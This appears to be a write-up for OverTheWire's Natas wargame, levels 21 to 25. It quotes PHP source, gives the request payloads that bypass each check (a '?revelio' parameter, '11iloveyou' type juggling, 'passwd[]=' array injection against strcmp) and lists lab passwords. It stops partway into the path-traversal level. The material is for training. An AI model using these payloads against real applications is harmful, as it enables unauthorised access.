+ SO, we will get a new phpsessid in the response. Copy paste the session cookie in the main page(first page) and get the password for the next level.
Username: natas22
Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ

# Level 21-> level 22 
After logging in with the above credentials,we will get a page which have a like to see the source code.
+ Checking the source code gives:
```
	<?
    if(array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas23\n";
    print "Password: <censored></pre>";
    }
?>
```
+ IN burp, send revelio as $_GET parameter and intercept the response using burp to get the credentials. 
	`GET /?revelio HTTP/1.1`
Username: natas23
Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
	
# Level 22->level 23
+ WHen we login with the above credentials, we get a page which has an input field to insert password.
+SOurce code given:
```
	<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas24 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
```
+ Here, there is a check for the password length. But after looking at the PHP documentation it seems that strstr() “Find the first occurrence of a string”, so the string does not need to be equals to iloveyou, it justs need to be present into the string. Then, to bypass the second part of the string, I just added some number in front of the string, like that : 123iloveyou. Also, it checks the first two numbers of the string only. For eg: if we give `10iloveyou` it gives the msg wrong. But if we give `11iloveyou`, It gives the password. 
+ Username: natas24 
Password: OsRmXFguozKpTZZ5X14zNO43379LZveg
	

# Level 23 -> Level 24

After logging with the credentials,we can see a similar page like last level. Source code is given:
```
	<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
```
+The official documentation for strcmp states that if the strings match, a 0 will be returned, otherwise a positive or negative number will be returned.

A result of 0 would be interpreted as false. By NOT’ing false we get true. This true value would be evaluated by the if statement and the program would then print the credentials. Whereas a result of any number besides 0 is interpreted as true, and NOT’d to false. This false value would cause the program would move to the else clause and print “Wrong!” At least that’s what the intent was.

+ So, 0 can be printed if the strings are equal,but there are still other ways to give 0 as output.
+ One way is comparing an array to a string. The result is NULL and a warning is displayed. NULL is evaluated to be 0.
+ ANother way is that, when we compare array with zero, it will also return null, evaluated to 0.
+ So modifying the url with the following way can print out the credentials,
 http://natas24.natas.labs.overthewire.org/?passwd[]=abcd
 http://natas24.natas.labs.overthewire.org/?passwd[]=0
+ Username: natas25 
  Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c

## Reference:
https://www.php.net/manual/en/function.strcmp.php
https://marcosvalle.github.io/ctf/php/2016/05/12/php-comparison-vlun.html
	
# Level 24 -> Level 25:
	
After logging in with the credentials, we can see a passage which can be changed to english and german
Source code is given,
```
<?php
    // cheers and <3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
    
    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return 0;
    }
    
    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;
        
        closedir($handle);
        return $listoffiles;
    } 
    
    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?>
```
+ Vulnerability is in `setLanguage()` function. 
+ Opening the page in web,
	

	



    






